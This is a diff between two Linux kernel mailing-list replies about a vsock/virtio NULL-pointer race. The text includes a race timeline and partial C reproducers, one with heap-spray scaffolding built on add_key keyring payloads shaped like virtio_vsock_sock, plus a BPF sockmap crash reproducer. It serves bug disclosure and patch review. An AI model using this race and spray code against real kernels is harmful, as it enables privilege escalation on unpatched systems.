@@ -1,593 +1,237 @@
-Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from mailtransmit05.runbox.com (mailtransmit05.runbox.com [185.226.149.38])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B423613D518
-	for <virtualization@lists.linux.dev>; Wed, 18 Dec 2024 15:51:22 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3B529380;
+	Thu, 19 Dec 2024 00:25:58 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.226.149.38
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1734537084; cv=none; b=PombMsRjedVT6GCkYZcDlwpLGXLy83pDPSsm/+tKeVgLjyqGFI0N4HvsGUwD/EIpKFvfjDb2m09e7W0XeZIB2HWBb0Arr4NRTWfGVhpu1G718ZUb2rIQwKNFicvYkHHmEqjGpZ7/8hWiejTCg+jSEE2I72E2GJp35OpdDfwPqZI=
+	t=1734567965; cv=none; b=Nm87uNOpCP92aBktAk1ztWnG2Rlc5Ie2GUrSoG4gHQarMTXutVh8uCOcLtTspgLyRQeUMLhrlcmVacRqrMKVqWVlWfuD8KQKPakEhDYs3HQDKDEkXSua13jc6trJ5f1Mo/F9qcRCK7sk78vfsNXQMcqaW0WwOQo9uqyW5tB0n8E=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1734537084; c=relaxed/simple;
-	bh=vKSToiSLhmTwRai64uJTRLmJ47/l+aBpbZErinLEj3g=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=g1ZnOiTUJdC+zPOEg79/wITxrGGuDCN2MJb0OWYhUauo+WxsFflbibIUHQJHyJYqx2qrc4iebszfyZA+QpeDPmcEB6OkToLcZMX2BvPZA48YL85MXqLsN7MQobrMT+pBi6F8MyCLeBZF4mSocFvumAo5kr0Fasgu9iUpJt47XWg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io; spf=pass smtp.mailfrom=theori.io; dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b=eOdRoRLF; arc=none smtp.client-ip=209.85.210.174
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=theori.io
+	s=arc-20240116; t=1734567965; c=relaxed/simple;
+	bh=Ik7Gh9XllpXEehIMUzBreugnNnoWolK+VcZLUNIvmQw=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=TWQpaj8U76HA1hJt6TDM/t+ww1LLWjOnb3Qair4Q9Aruii6UFwO3zCsTkwwqQG7kyMn6Oo67Jk5sZVsvhgHyKPF4iLceugowOtvsRKx8yFYHWzG4AU0cf5HcyxSwxpr9D5tKDMsLtcxLCYsyuG9Cf37187nPw/bksGpCCnHLT4Y=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=rbox.co; spf=pass smtp.mailfrom=rbox.co; dkim=pass (2048-bit key) header.d=rbox.co header.i=@rbox.co header.b=KIgwTA8i; arc=none smtp.client-ip=185.226.149.38
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=rbox.co
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=rbox.co
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b="eOdRoRLF"
-Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-725ee27e905so8455806b3a.2
-        for <virtualization@lists.linux.dev>; Wed, 18 Dec 2024 07:51:22 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=theori.io; s=google; t=1734537082; x=1735141882; darn=lists.linux.dev;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date:from:to
-         :cc:subject:date:message-id:reply-to;
-        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
-        b=eOdRoRLFN0k15eOoPlBCjznxb4sG+QCkqC5gzByvDfh8US5P3qxnYgDwyxl71ma3aB
-         iUkMJWGvjnoUpnkAxLn/W/JwGJN2iZRImt/5LWc74MjagTrBdHLC4gemi5vWHM2IXEGT
-         Lzd/u/04uKcGtZxMPp2emKOdtCge5YGypzQL8=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1734537082; x=1735141882;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
-        b=YO2522aH9mzRzJnsFaLeBFjJVF4RUPLD39vQ5F96swEIApuWDU9Tn14wqoRt+rsyjH
-         yHCUjeXyNMlfVvKbAxICwxoK1li4VXqywjGbY+W8QMgWChVcecXjo387tVyWx41eZp3j
-         dmnu1sRyKEkwxiEiTiHtvBku6ognaDwtlP5d/WqWf7bqXSt98nfAlQj3ozOX8fNnRLQi
-         +SrhGrgh5WWLY7GZy7vtKg3ss0gc/xX4me0gJ2FZeddeNUhy3hyDwrEQIDG+CCv29/U0
-         jyKlnvhVsyY9C0PHL70vFYPJCvMERH3UQpWAtxFWEyZw0qWAMiLzU1uD6BkvSIXkQfwu
-         f41Q==
-X-Forwarded-Encrypted: i=1; AJvYcCXszVnlfwTYyNytoyO+LFzfTISI8WdRMmqnuQzAz+AKYe9SkHckQT8+zKCOyO1PhCFlH5s2BtiV+eKd6FCLcA==@lists.linux.dev
-X-Gm-Message-State: AOJu0YzBfCgoAVhqBo0NApdVOa5OzwUtoUb9nibX1VjaSxiEhnVTqpl+
-	AUsFE0Tb3k/Cjhu+JbftotcL0WeWFERPUuzdxdR/RP1Uox5G2nl7ZzvdwmkntgE=
-X-Gm-Gg: ASbGncvmeqFyzleK/WILZwRUdfo6qr/pqO0wp3K8iZ1BSu9+7NR5zfdo2NmUDl0zZgD
-	jSwr3+LvUkOCTZFyLNTycRm55Qha0o5njoP11JhpadH4RocPdDdOnReC1dL5pynnhzqP5BE103X
-	pz3q6wNM9PPn+lmiWRgn/o37oLZ1OpYOIjGkCJSwZCyMwJaOiu4Z5zOfLcFfNScK6woyRC/35pE
-	oW4Dg+ZYPwsnFBaU/GN14laMwZZmWR7y9HldB7l+jrp6F+PricTH50mk/0G+XduF5moPg==
-X-Google-Smtp-Source: AGHT+IGzKargL40J80eukxnNz3oeZ4Rde1G2gdGJiTCL0BnxcJqRGL4rHVd7OJr6IIrG1MPh1hJJAg==
-X-Received: by 2002:a05:6a21:6da7:b0:1e4:8fdd:8c77 with SMTP id adf61e73a8af0-1e5b4603cc7mr5914783637.8.1734537081974;
-        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
-Received: from v4bel-B760M-AORUS-ELITE-AX ([211.219.71.65])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-72918ad8f34sm8711036b3a.77.2024.12.18.07.51.18
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
-Date: Wed, 18 Dec 2024 10:51:17 -0500
-From: Hyunwoo Kim <v4bel@theori.io>
-To: Stefano Garzarella <sgarzare@redhat.com>
-Cc: "David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>, Jason Wang <jasowang@redhat.com>,
-	"Michael S. Tsirkin" <mst@redhat.com>,
-	virtualization@lists.linux.dev, netdev@vger.kernel.org,
-	qwerty@theori.io, imv4bel@gmail.com, v4bel@theori.io
-Subject: Re: [PATCH] vsock/virtio: Fix null-ptr-deref in vsock_stream_has_data
-Message-ID: <Z2LvdTTQR7dBmPb5@v4bel-B760M-AORUS-ELITE-AX>
-References: <Z2K/I4nlHdfMRTZC@v4bel-B760M-AORUS-ELITE-AX>
- <lwfkm3salizjvubc5vqnkxi4bk4zdglg5um4xygfxwmrkktrbc@bvazoy4k723k>
- <Z2LZ3HK05RH8OfP5@v4bel-B760M-AORUS-ELITE-AX>
- <s2k74f6zvjm7uexqfyej6txvoqgf6lkaa47igo2eh4pq55d4n2@wnrrcr6aa6lk>
- <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
+	dkim=pass (2048-bit key) header.d=rbox.co header.i=@rbox.co header.b="KIgwTA8i"
+Received: from mailtransmit03.runbox ([10.9.9.163] helo=aibo.runbox.com)
+	by mailtransmit05.runbox.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.93)
+	(envelope-from <mhal@rbox.co>)
+	id 1tO4MQ-006Eqz-5Z; Thu, 19 Dec 2024 01:25:50 +0100
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=rbox.co;
+	s=selector2; h=Content-Transfer-Encoding:Content-Type:In-Reply-To:From:
+	References:Cc:To:Subject:MIME-Version:Date:Message-ID;
+	bh=k+DJS2pgh+FJsAXhHPOasPWju3JjAyGK9qdWeo88ra8=; b=KIgwTA8iLKwO5ZnrF4EDth0xW3
+	Xnk1G7Cs7qZN85DkaIBk00PouzzctH70/cHsSGXxokzEHv8srZBoetjAQg7wDs6ppt2om2HXHTNy9
+	D5TLPrZdFpM2zXD/i90crMovqHR2SEWDTeYUfmRCElfyY6Dbv3JNyE4pOEhc7FWc28FkCt0pb3tVM
+	DKe7dMAh3jXngJhuST2r2SEFtCON6E5j1uB+C2oQSITCVtY3chZHQPWBpv3PH54Br2cuHpFgjFG7S
+	/jSgMhU6FF1dTyEC/6PBVG6IpEBfyUFTHMJYlv3163SC+yEnr2V9mtLK4pZVXd7tDrbqkSZ4rSBmZ
+	XQMA0Z7Q==;
+Received: from [10.9.9.73] (helo=submission02.runbox)
+	by mailtransmit03.runbox with esmtp (Exim 4.86_2)
+	(envelope-from <mhal@rbox.co>)
+	id 1tO4MO-0001Xh-Uw; Thu, 19 Dec 2024 01:25:49 +0100
+Received: by submission02.runbox with esmtpsa  [Authenticated ID (604044)]  (TLS1.2:ECDHE_SECP256R1__RSA_PSS_RSAE_SHA256__AES_256_GCM:256)
+	(Exim 4.93)
+	id 1tO4MC-00AgrT-34; Thu, 19 Dec 2024 01:25:36 +0100
+Message-ID: <5ca20d4c-1017-49c2-9516-f6f75fd331e9@rbox.co>
+Date: Thu, 19 Dec 2024 01:25:34 +0100
 Precedence: bulk
 X-Mailing-List: virtualization@lists.linux.dev
 List-Id: <virtualization.lists.linux.dev>
 List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH] vsock/virtio: Fix null-ptr-deref in vsock_stream_has_data
+To: Hyunwoo Kim <v4bel@theori.io>, Stefano Garzarella <sgarzare@redhat.com>
+Cc: "David S. Miller" <davem@davemloft.net>,
+ Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
+ Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
+ Jason Wang <jasowang@redhat.com>, "Michael S. Tsirkin" <mst@redhat.com>,
+ virtualization@lists.linux.dev, netdev@vger.kernel.org, qwerty@theori.io,
+ imv4bel@gmail.com
+References: <Z2K/I4nlHdfMRTZC@v4bel-B760M-AORUS-ELITE-AX>
+ <lwfkm3salizjvubc5vqnkxi4bk4zdglg5um4xygfxwmrkktrbc@bvazoy4k723k>
+ <Z2LZ3HK05RH8OfP5@v4bel-B760M-AORUS-ELITE-AX>
+ <s2k74f6zvjm7uexqfyej6txvoqgf6lkaa47igo2eh4pq55d4n2@wnrrcr6aa6lk>
+ <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
+ <Z2LvdTTQR7dBmPb5@v4bel-B760M-AORUS-ELITE-AX>
+From: Michal Luczaj <mhal@rbox.co>
+Content-Language: pl-PL, en-GB
+Autocrypt: addr=regenrecht@o2.pl; keydata=
+ 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
+In-Reply-To: <Z2LvdTTQR7dBmPb5@v4bel-B760M-AORUS-ELITE-AX>
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
-In-Reply-To: <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
 
-On Wed, Dec 18, 2024 at 04:31:03PM +0100, Stefano Garzarella wrote:
-> On Wed, Dec 18, 2024 at 03:40:40PM +0100, Stefano Garzarella wrote:
-> > On Wed, Dec 18, 2024 at 09:19:08AM -0500, Hyunwoo Kim wrote:
-> > > On Wed, Dec 18, 2024 at 02:40:49PM +0100, Stefano Garzarella wrote:
-> > > > On Wed, Dec 18, 2024 at 07:25:07AM -0500, Hyunwoo Kim wrote:
-> > > > > When calling connect to change the CID of a vsock, the loopback
-> > > > > worker for the VIRTIO_VSOCK_OP_RST command is invoked.
-> > > > > During this process, vsock_stream_has_data() calls
-> > > > > vsk->transport->stream_has_data().
-> > > > > However, a null-ptr-deref occurs because vsk->transport was set
-> > > > > to NULL in vsock_deassign_transport().
-> > > > > 
-> > > > >                     cpu0                                                      cpu1
-> > > > > 
-> > > > >                                                               socket(A)
-> > > > > 
-> > > > >                                                               bind(A, VMADDR_CID_LOCAL)
-> > > > >                                                                 vsock_bind()
-> > > > > 
-> > > > >                                                               listen(A)
-> > > > >                                                                 vsock_listen()
-> > > > >  socket(B)
-> > > > > 
-> > > > >  connect(B, VMADDR_CID_LOCAL)
-> > > > > 
-> > > > >  connect(B, VMADDR_CID_HYPERVISOR)
-> > > > >    vsock_connect(B)
-> > > > >      lock_sock(sk);
-> 
-> It shouldn't go on here anyway, because there's this check in
-> vsock_connect():
-> 
-> 	switch (sock->state) {
-> 	case SS_CONNECTED:
-> 		err = -EISCONN;
-> 		goto out;
+On 12/18/24 16:51, Hyunwoo Kim wrote:
+> On Wed, Dec 18, 2024 at 04:31:03PM +0100, Stefano Garzarella wrote:
+>> On Wed, Dec 18, 2024 at 03:40:40PM +0100, Stefano Garzarella wrote:
+>>> On Wed, Dec 18, 2024 at 09:19:08AM -0500, Hyunwoo Kim wrote:
+>>>> At least for vsock_loopback.c, this change doesn’t seem to introduce any
+>>>> particular issues.
+>>>
+>>> But was it working for you? because the check was wrong, this one should
+>>> work, but still, I didn't have time to test it properly, I'll do later.
+>>>
+>>> diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
+>>> index 9acc13ab3f82..ddecf6e430d6 100644
+>>> --- a/net/vmw_vsock/virtio_transport_common.c
+>>> +++ b/net/vmw_vsock/virtio_transport_common.c
+>>> @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
+>>>        lock_sock(sk);
+>>> -       /* Check if sk has been closed before lock_sock */
+>>> -       if (sock_flag(sk, SOCK_DONE)) {
+>>> +       /* Check if sk has been closed or assigned to another transport before
+>>> +        * lock_sock
+>>> +        */
+>>> +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != &t->transport) {
+>>>                (void)virtio_transport_reset_no_sock(t, skb);
+>>>                release_sock(sk);
+>>>                sock_put(sk);
 
-By using a kill signal, set sock->state to SS_UNCONNECTED and sk->sk_state to 
-TCP_CLOSING before the second connect() is called, causing the worker to 
-execute without the SOCK_DONE flag being set.
+Hi, I got curious about this race, my 2 cents:
 
-> 
-> 
-> Indeed if I try, I have this behaviour:
-> 
-> shell1# python3
-> import socket
-> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-> s.bind((1,1234))
-> s.listen()
-> 
-> shell2# python3
-> import socket
-> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-> s.connect((1, 1234))
-> s.connect((2, 1234))
-> Traceback (most recent call last):
->   File "<stdin>", line 1, in <module>
-> OSError: [Errno 106] Transport endpoint is already connected
-> 
-> 
-> Where 106 is exactly EISCONN.
-> So, do you have a better reproducer for that?
+Your patch seems to fix the reported issue, but there's also a variant (as
+in: transport going null unexpectedly) involving BPF:
 
-The full scenario is as follows:
-```
-                     cpu0                                                      cpu1
+/*
+$ gcc vsock-transport.c && sudo ./a.out
 
-                                                               socket(A)
+BUG: kernel NULL pointer dereference, address: 00000000000000a0
+#PF: supervisor read access in kernel mode
+#PF: error_code(0x0000) - not-present page
+PGD 12faf8067 P4D 12faf8067 PUD 113670067 PMD 0
+Oops: Oops: 0000 [#1] PREEMPT SMP NOPTI
+CPU: 15 UID: 0 PID: 1198 Comm: a.out Not tainted 6.13.0-rc2+
+RIP: 0010:vsock_connectible_has_data+0x1f/0x40
+Call Trace:
+ vsock_bpf_recvmsg+0xca/0x5e0
+ sock_recvmsg+0xb9/0xc0
+ __sys_recvfrom+0xb3/0x130
+ __x64_sys_recvfrom+0x20/0x30
+ do_syscall_64+0x93/0x180
+ entry_SYSCALL_64_after_hwframe+0x76/0x7e
+*/
 
-                                                               bind(A, {cid: VMADDR_CID_LOCAL, port: 1024})
-                                                                 vsock_bind()
-
-                                                               listen(A)
-                                                                 vsock_listen()
-  socket(B)
-
-  connect(B, {cid: VMADDR_CID_LOCAL, port: 1024})
-    vsock_connect()
-      lock_sock(sk);
-      virtio_transport_connect()
-        virtio_transport_connect()
-          virtio_transport_send_pkt_info()
-            vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_REQUEST)
-              queue_work(vsock_loopback_work)
-      sk->sk_state = TCP_SYN_SENT;
-      release_sock(sk);
-                                                               vsock_loopback_work()
-                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_REQUEST)
-                                                                   sk = vsock_find_bound_socket(&dst);
-                                                                   virtio_transport_recv_listen(sk, skb)
-                                                                     child = vsock_create_connected(sk);
-                                                                     vsock_assign_transport()
-                                                                       vvs = kzalloc(sizeof(*vvs), GFP_KERNEL);
-                                                                     vsock_insert_connected(vchild);
-                                                                       list_add(&vsk->connected_table, list);
-                                                                     virtio_transport_send_response(vchild, skb);
-                                                                       virtio_transport_send_pkt_info()
-                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RESPONSE)
-                                                                           queue_work(vsock_loopback_work)
-
-                                                               vsock_loopback_work()
-                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RESPONSE)
-                                                                   sk = vsock_find_bound_socket(&dst);
-                                                                   lock_sock(sk);
-                                                                   case TCP_SYN_SENT:
-                                                                   virtio_transport_recv_connecting()
-                                                                     sk->sk_state = TCP_ESTABLISHED;
-                                                                   release_sock(sk);
-
-                                                               kill(connect(B));
-      lock_sock(sk);
-      if (signal_pending(current)) {
-      sk->sk_state = sk->sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
-      sock->state = SS_UNCONNECTED;
-      release_sock(sk);
-
-  connect(B, {cid: VMADDR_CID_HYPERVISOR, port: 1024})
-    vsock_connect(B)
-      lock_sock(sk);
-      vsock_assign_transport()
-        virtio_transport_release()
-          virtio_transport_close()
-            if (!(sk->sk_state == TCP_ESTABLISHED || sk->sk_state == TCP_CLOSING))
-            virtio_transport_shutdown()
-              virtio_transport_send_pkt_info()
-                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
-                  queue_work(vsock_loopback_work)
-        vsock_deassign_transport()
-          vsk->transport = NULL;
-        return -ESOCKTNOSUPPORT;
-      release_sock(sk);
-                                                               vsock_loopback_work()
-                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
-                                                                   virtio_transport_recv_connected()
-                                                                     virtio_transport_reset()
-                                                                       virtio_transport_send_pkt_info()
-                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
-                                                                           queue_work(vsock_loopback_work)
-
-                                                               vsock_loopback_work()
-                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
-								   virtio_transport_recv_disconnecting()
-								     virtio_transport_do_close()
-								       vsock_stream_has_data()
-								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
-```
-
-And the reproducer I used is as follows, but since it’s a race condition, 
-triggering it might take a long time depending on the environment. 
-Therefore, it’s a good idea to add an mdelay to the appropriate vsock function:
-```
-#define _GNU_SOURCE
 #include <stdio.h>
-#include <stdlib.h>
-#include <sys/socket.h>
-#include <linux/vm_sockets.h>
-#include <unistd.h>
-#include <pthread.h>
-#include <fcntl.h>
-#include <syscall.h>
-#include <stdarg.h>
-#include <sched.h>
-#include <signal.h>
-#include <time.h>
-#include <errno.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <sys/times.h>
-#include <sys/timerfd.h>
-#include <sys/wait.h>
-#include <sys/socket.h>
-#include <stddef.h>
-#include <linux/types.h>
 #include <stdint.h>
-#include <linux/keyctl.h>
-#include <stdio.h>
 #include <stdlib.h>
-#include <syscall.h>
-#include <stdarg.h>
-#include <sched.h>
-#include <signal.h>
-#include <time.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <sys/times.h>
-#include <sys/timerfd.h>
-#include <sys/wait.h>
 #include <sys/socket.h>
-#include <stddef.h>
+#include <sys/syscall.h>
+#include <linux/bpf.h>
+#include <linux/vm_sockets.h>
 
-#define FAIL_IF(x) if ((x)) { \
-        perror(#x); \
-        return -1; \
-}
-#define SPRAY_ERROR 0
-#define SPRAY_RETRY 1
-#define SPRAY_SUCCESS 2
-
-#define LAST_RESERVED_PORT 1023
-
-#define NS_PER_JIFFIE 1000000ull
-
-int cid_port_num = LAST_RESERVED_PORT;
-
-void *trigger_stack = NULL;
-void *heap_spray_stack = NULL;
-volatile int status_spray = SPRAY_ERROR;
-
-struct virtio_vsock_sock {
-	void *vsk;
-	int tx_lock;
-	int rx_lock;
-	int tx_cnt;
-	int peer_fwd_cnt;
-	int peer_buf_alloc;
-	int fwd_cnt;
-	int last_fwd_cnt;
-	int rx_bytes;
-	int buf_alloc;
-	char pad[4];
-	char rx_queue[24];
-	int msg_count;
-};
-_Static_assert(sizeof(struct virtio_vsock_sock) == 80, "virtio_vsock_sock size missmatch");
-
-union key_payload {
-        struct virtio_vsock_sock vvs;
-        struct {
-                char header[24];
-                char data[];
-        } key;
-};
-
-#define MAIN_CPU 0
-#define HELPER_CPU 1
-
-inline static int _pin_to_cpu(int id)
+static void die(const char *msg)
 {
-        cpu_set_t set;
-        CPU_ZERO(&set);
-        CPU_SET(id, &set);
-        return sched_setaffinity(getpid(), sizeof(set), &set);
+	perror(msg);
+	exit(-1);
 }
 
-typedef int key_serial_t;
-
-inline static key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
+static int create_sockmap(void)
 {
-	return syscall(__NR_add_key, type, description, payload, plen, ringid);
